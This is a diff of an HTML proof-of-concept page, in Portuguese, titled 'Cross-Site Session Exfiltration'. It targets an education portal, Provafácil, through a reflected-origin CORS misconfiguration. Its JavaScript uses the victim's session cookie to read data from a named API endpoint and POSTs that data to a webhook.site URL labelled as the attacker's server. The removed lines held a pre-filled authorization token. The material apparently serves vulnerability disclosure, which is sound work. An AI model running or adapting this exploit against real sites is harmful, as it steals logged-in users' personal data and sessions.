@@ -2,71 +2,94 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>POC: CORS Misconfiguration - Provafácil</title>
+    <title>POC: Cross-Site Session Exfiltration</title>
+    <meta name="referrer" content="no-referrer">
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; }
-        .console { background: #222; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; margin-top: 20px; white-space: pre-wrap; }
-        .badge { display: inline-block; padding: 5px 10px; background: #28a745; color: white; border-radius: 4px; font-size: 12px; margin-bottom: 10px; }
-        .badge-critical { background: #dc3545; }
-        h2 { color: #333; }
-        code { background: #eee; padding: 2px 5px; border-radius: 3px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; }
+        body { font-family: Arial, sans-serif; padding: 20px; background: #1a1a1a; color: #e0e0e0; }
+        .console { background: #000; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; margin-top: 20px; white-space: pre-wrap; border: 1px solid #333; }
+        .badge { display: inline-block; padding: 5px 10px; background: #dc3545; color: white; border-radius: 4px; font-size: 12px; margin-bottom: 10px; font-weight: bold; }
+        h1, h2 { color: #fff; }
+        code { background: #333; padding: 2px 5px; border-radius: 3px; color: #ff9800; }
+        .status { margin-top: 20px; padding: 10px; background: #333; border-radius: 4px; }
+        .success { background: #28a745; color: white; }
+        .error { background: #dc3545; color: white; }
     </style>
 </head>
 <body>
 
-    <h1>🔬 POC: Cross-Origin Data Exfiltration via CORS</h1>
-    <p>Esta página demonstra como um atacante pode exfiltrar dados sensíveis de um usuário autenticado na API da Provafácil, mesmo que o script esteja rodando em um domínio de terceiros.</p>
+    <h1>🕵️‍♂️ POC: Cross-Site Session Exfiltration</h1>
+    <p>Esta página demonstra como um atacante pode exfiltrar dados de um usuário <strong>logado</strong> na Provafácil, mesmo que o script esteja rodando em um domínio de terceiros.</p>
     
-    <div class="badge badge-critical">STATUS: PRONTO PARA ATAQUE</div>
-    <p><strong>Cenário:</strong> O atacante já obteve o <code>Authorization Token</code> da vítima (ex: via XSS, log de rede, ou interceptação). Agora, ele usa a misconfiguração de CORS para exfiltrar dados de qualquer origem.</p>
-    <p><strong>Como funciona:</strong> O script envia uma request <code>fetch</code> para a API da Provafácil com o header <code>Authorization</code> e <code>credentials: 'include'</code>. Como o servidor reflete a origem (<code>evil.com</code>) e permite o header <code>authorization</code> (via preflight), o navegador permite a leitura da resposta.</p>
+    <div class="badge">STATUS: AGUARDANDO EXECUÇÃO</div>
+    
+    <h2>Como Funciona</h2>
+    <ol>
+        <li>O script faz uma requisição <code>fetch</code> para a API da Provafácil.</li>
+        <li>Como <code>credentials: 'include'</code> está ativo, o navegador inclui o <code>Cookie: sessionid</code> da vítima.</li>
+        <li>O servidor da Provafácil valida a sessão e retorna os dados do usuário logado.</li>
+        <li>Como o CORS está mal configurado (reflete a origem), o navegador permite que o script leia a resposta.</li>
+        <li>O script exfiltra os dados para o meu servidor.</li>
+    </ol>
 
-    <h2>1. Insira o Token da Vítima</h2>
-    <p>Cole o <code>Authorization Token</code> da vítima (formato: <code>Token [hex_string]</code>). Você pode obtê-lo no DevTools da vítima (aba Network > Headers > Authorization).</p>
-    <input type="text" id="victimToken" placeholder="Token 4953cd2bb8d7d4c6f3ed7d63061b189c8d9974e0" value="Token 4953cd2bb8d7d4c6f3ed7d63061b189c8d9974e0">
+    <div class="status" id="statusBox">
+        <strong>Instruções:</strong>
+        <ol>
+            <li>Abra o portal da Provafácil em outra aba (<a href="https://aluno.provafacilnaweb.com.br" target="_blank">aluno.provafacilnaweb.com.br</a>).</li>
+            <li>Faça login com as credenciais de teste.</li>
+            <li>Volte para esta página.</li>
+            <li>Clique no botão abaixo.</li>
+        </ol>
+    </div>
 
-    <h2>2. Console de Exfiltração</h2>
-    <div id="console" class="console">Aguardando execução...\n</div>
-
-    <button onclick="executeAttack()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 10px;">
-        🚀 Executar Exfiltração
+    <button onclick="executeAttack()" style="margin-top: 20px; padding: 15px 30px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold;">
+        🚀 Iniciar Exfiltração
     </button>
+
+    <h2>Console de Exfiltração</h2>
+    <div id="console" class="console">Aguardando início...\n</div>
 
     <script>
         const API_URL = 'https://uj-uva.provafacilnaweb.com.br/uj-uva/api/v2/ot/get-menu/';
         const ATTACKER_LOG_URL = 'https://webhook.site/a4aa265f-a678-4d16-9e05-7d894636caed'; // Substitua
         const consoleEl = document.getElementById('console');
+        const statusBox = document.getElementById('statusBox');
 
         function log(msg) {
             consoleEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
             console.log(msg);
         }
 
-        async function executeAttack() {
-            const token = document.getElementById('victimToken').value.trim();
-            if (!token) {
-                log("❌ Erro: Insira um token válido.");
-                return;
-            }
+        function setStatus(msg, type) {
+            statusBox.innerHTML = `<strong class="${type}">${msg}</strong>`;
+        }
 
-            log(`Iniciando exfiltração com token: ${token.substring(0, 20)}...`);
+        async function executeAttack() {
+            setStatus("Executando ataque...", "info");
+            log("Iniciando exfiltração...");
+            log(`Origin atual: ${window.location.origin}`);
             log(`Enviando request para: ${API_URL}`);
-            log(`Headers: Authorization: ${token}, credentials: 'include'`);
+            log(`Modo: credentials: 'include' (Cookie de sessão será enviado automaticamente)`);
 
             try {
                 const response = await fetch(API_URL, {
                     method: 'GET',
                     credentials: 'include',
                     headers: {
-                        'Accept': 'application/json, text/plain, */*',
-                        'Authorization': token
+                        'Accept': 'application/json, text/plain, */*'
                     }
                 });
 
+                log(`Status HTTP: ${response.status} ${response.statusText}`);
+                log(`Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}`);
+                log(`Content-Type: ${response.headers.get('Content-Type')}`);
+
                 if (!response.ok) {
-                    log(`Erro HTTP: ${response.status} ${response.statusText}`);
-                    log("Verifique se o token é válido e não expirou.");
+                    log(`❌ FALHA: HTTP ${response.status}`);
+                    log("Possíveis causas:");
+                    log("1. Você não está logado na Provafácil.");
+                    log("2. O cookie 'sessionid' expirou.");
+                    log("3. O backend rejeitou o Sec-Fetch-Site: cross-site.");
+                    setStatus("Falha na exfiltração. Verifique se está logado.", "error");
                     return;
                 }
 
@@ -84,12 +107,13 @@
                 log("----------------------------------------");
 
                 const exfiltrationPayload = {
-                    source: "CORS_POC",
+                    source: "CORS_SESSION_POC",
                     victim_origin: window.location.origin,
                     timestamp: new Date().toISOString(),
                     victim_data: data
                 };
 
+                log("Enviando payload para o servidor do atacante...");
                 await fetch(ATTACKER_LOG_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -97,10 +121,12 @@
                 });
 
                 log("✅ Payload entregue ao atacante. Fim da demonstração.");
+                setStatus("SUCESSO: Dados exfiltrados para o servidor do atacante.", "success");
 
             } catch (error) {
-                log(`❌ FALHA NO ATAQUE: ${error.message}`);
-                log("Verifique o console do navegador (F12) para detalhes.");
+                log(`❌ ERRO DE REDE: ${error.message}`);
+                log("Verifique a conexão e se o CORS está bloqueando a leitura.");
+                setStatus("Erro de rede ou bloqueio de CORS.", "error");
             }
         }
     </script>
